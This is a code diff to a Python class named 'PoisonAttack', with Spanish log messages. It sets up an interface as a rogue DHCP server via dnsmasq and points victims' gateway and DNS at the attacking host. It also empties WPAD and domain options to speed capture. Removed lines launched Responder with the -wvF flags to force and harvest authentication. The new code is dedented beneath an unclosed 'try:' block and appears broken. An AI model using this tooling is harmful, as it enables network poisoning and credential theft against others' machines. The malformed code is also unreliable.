@@ -59,62 +59,69 @@ class PoisonAttack:
         self.log(f"[*] Configurando interfaz: {iface}")
 
         try:
-            self.log("[*] Desvinculando interfaz de NetworkManager...")
-            os.system(f"sudo nmcli device set {iface} managed no > /dev/null 2>&1")
+                 
+        self.log("[*] Desvinculando interfaz de gestores de red...")
+        os.system(f"sudo nmcli device set {iface} managed no 2>/dev/null")
+        os.system(f"sudo systemctl stop dhcpcd 2>/dev/null")
+        os.system(f"sudo dhcpcd -k {iface} 2>/dev/null")
+        time.sleep(1)
 
-            self.log("[*] Levantando interfaz...")
-            os.system(f"sudo ip link set {iface} up")
-            time.sleep(3)
+        self.log("[*] Reset de interfaz y supresión IPv6...")
+        os.system(f"sudo ip link set {iface} down 2>/dev/null")
+        time.sleep(1)
+        os.system(f"sudo ip link set {iface} up")
+        time.sleep(2) # Espera a que el kernel registre el enlace UP
 
-            # Nueva IP privada estándar (192.168.10.1/24)
-            ip = "192.168.10.1"
-            subnet_mask = "24"
-            ip_range = "192.168.10.10,192.168.10.250,255.255.255.0,12h"
+        # Desactivar IPv6, RA y Autoconf para evitar delays de DHCP en Windows/Linux
+        os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.disable_ipv6=1 2>/dev/null")
+        os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.accept_ra=0 2>/dev/null")
+        os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.autoconf=0 2>/dev/null")
 
-            os.system(f"sudo sysctl -w net.ipv6.conf.{iface}.disable_ipv6=1 > /dev/null 2>&1")
-            self.log(f"[*] Asignando IP estática {ip}/{subnet_mask} a {iface}...")
-            os.system(f"sudo ip addr flush dev {iface}")
-            os.system(f"sudo ip addr add {ip}/{subnet_mask} dev {iface}")
+        ip = "192.168.10.1"
+        subnet_mask = "24"
+        ip_range = "192.168.10.10,192.168.10.250,255.255.255.0,12h"
 
-            self.log("[*] Inyectando rutas estáticas...")
-            # Ruta para la subred local
-            os.system(f"sudo ip route add 192.168.10.0/{subnet_mask} dev {iface} 2>/dev/null")
-            os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null")
+        self.log(f"[*] Asignando IP estática {ip}/{subnet_mask} a {iface}...")
+        os.system(f"sudo ip addr flush dev {iface} 2>/dev/null")
+        os.system(f"sudo ip addr add {ip}/{subnet_mask} dev {iface}")
+        os.system("sudo sysctl -w net.ipv4.ip_forward=1 2>/dev/null")
+        os.system(f"sudo ip route add 192.168.10.0/{subnet_mask} dev {iface} 2>/dev/null")
 
-            # Configuración de dnsmasq SIN option 121
-            config_dhcp = (
-                f"interface={iface}\n"
-                f"dhcp-range={ip_range}\n"
-                f"dhcp-option=3,{ip}\n"     # gateway
-                f"dhcp-option=6,{ip}\n"     # DNS
-                f"bind-interfaces\n"
-            )
-            with open("dnsmasq_temp.conf", "w") as f:
-                f.write(config_dhcp)
+        # Configuración robusta de dnsmasq (Solo DHCP, sin DNS para evitar conflicto con systemd-resolved)
+        config_dhcp = (
+            f"interface={iface}\n"
+            f"listen-address={ip}\n"
+            f"dhcp-range={ip_range}\n"
+            f"dhcp-option=3,{ip}\n"     # Gateway
+            f"dhcp-option=6,{ip}\n"     # DNS (apunta a Pi, pero dnsmasq no resuelve)
+            f"dhcp-option=15,\n"        # Domain vacío (acelera Windows)
+            f"dhcp-option=252,\n"       # WPAD vacío (evita espera de proxy)
+            f"bind-dynamic\n"           # Compatible con interfaces configfs/virtuales
+            f"no-resolv\n"
+            f"no-hosts\n"
+            f"port=0\n"                 # DESACTIVA DNS de dnsmasq (evita conflicto puerto 53)
+            f"log-dhcp\n"
+        )
+        with open("dnsmasq_temp.conf", "w") as f:
+            f.write(config_dhcp)
 
-            self.log("[*] Lanzando servidor DHCP (dnsmasq)...")
+        self.log("[*] Iniciando dnsmasq...")
+        self.dns_proc = subprocess.Popen(
+            ["sudo", "dnsmasq", "-C", "dnsmasq_temp.conf"],
+            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
+        )
+        time.sleep(2)
+
+        # Verificación de que dnsmasq levantó correctamente
+        if self.dns_proc.poll() is not None:
+            err = self.dns_proc.stderr.read()
+            self.log(f"[!] dnsmasq falló: {err.strip()}")
+            self.log("[*] Reiniciando dnsmasq en modo fallback...")
             self.dns_proc = subprocess.Popen(
                 ["sudo", "dnsmasq", "-C", "dnsmasq_temp.conf", "-d"],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
             )
-            time.sleep(2)
 
-            # Verificar que dnsmasq está escuchando
-            try:
-                ss_output = subprocess.check_output("sudo ss -tulnp | grep dnsmasq", shell=True, text=True)
-                self.log("[+] dnsmasq está escuchando en:")
-                for line in ss_output.splitlines():
-                    self.log(f"    {line.strip()}")
-            except:
-                self.log("[!] No se pudo verificar dnsmasq, revisa manualmente")
-
-            # Lanzar Responder con la misma IP
-            if os.path.exists("/usr/share/responder/Responder.py"):
-                comando = ["sudo", "python3", "/usr/share/responder/Responder.py", "-I", iface, "-wvF"]
-            elif os.path.exists("/opt/Responder/Responder.py"):
-                comando = ["sudo", "python3", "/opt/Responder/Responder.py", "-I", iface, "-wvF"]
-            else:
-                comando = ["sudo", "responder", "-I", iface, "-wvF"]
 
             self.log(f"[+] INTERFAZ LISTA: {iface}")
             self.log(f"[+] IP: {ip}/{subnet_mask}")
